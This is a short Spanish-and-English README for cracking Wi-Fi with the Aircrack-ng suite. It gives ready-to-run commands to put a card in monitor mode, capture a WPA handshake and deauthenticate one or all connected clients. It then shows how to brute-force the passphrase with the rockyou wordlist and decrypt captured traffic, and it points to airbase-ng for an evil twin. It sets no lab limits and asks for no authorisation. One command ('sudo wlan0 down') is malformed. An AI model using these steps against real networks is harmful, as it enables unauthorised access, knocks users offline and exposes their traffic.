<img src="https://www.aircrack-ng.org/resources/aircrack-ng-new-logo.jpg" align=right>

# How to use Aircrack-ng for wireless cracking

_Note: This HowTo was created to be used in Kali Linux so we assume no liability regarding the bad results or any other issues when used in Windows._


**PASO 1:** Poner modo promiscuo la interfaz wireless 

_Manera #1_ Digite estos comandos:
> sudo ifconfig wlan0 down
> sudo ifconfig wlan0 mode monitor
> sudo ifconfig wlan0 up

_Manera #2_ Digite estos comandos:
> sudo wlan0 down
> sudo airmon-ng start wlan0
> airmon-ng check kill (this will check and kill off processes that might interfere with the aircrack-ng suite.)


**PASO 2:** Reconocer las redes disponibles

Digite el comando
> sudo airodump-ng wlan0mon

**PASO 3:** Escuchar por wlan0 el tráfico del AP y ver los dispositivos conectados:

Cuando se tenga identificado el SSID por utilizar, se digita:

_Manera 1:_ Digite el comando:
> sudo airodump-ng --channel [Channel number] --bssid [SSID MAC] --write psk wlan0mon

_Manera 2:_ Digite el comando:
> sudo airodump-ng --write captureone --output-format cap --bssid [SSID MAC] --channel [Channel number] wlan0mon

_Where:_
* -bssid MAC del ssid de la red
* -c canal de esta]

**PASO 4:** Desautenticar dispositivos pegados a una red mediante este comando:

> sudo aireplay-ng -0 [number deauth packs to send] -a [AP MAC add] -c [endpoint MAC add] wlan0mon

_Where:_
* -0 means deauthentication
* Number of deauths to send (you can send multiple if you wish); 0 means send them continuously
* -a is the MAC address of the access point
* -c is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
* wlan0mon is the interface name


**#PASO 5:** Usar aircrack para descifrar el PSK de WPA si hemos usado la manera #2 del paso 3
> aircrack-ng -w rockyou.txt captureone-01.cap


#**Adicional**: 

1. Para descifrar los paquetes capturados.
> sudo airdecap-ng -e 'the ssid' -p passphrase  tkip.cap

2. Para generar un evil twin se usa el suite airbase-ng

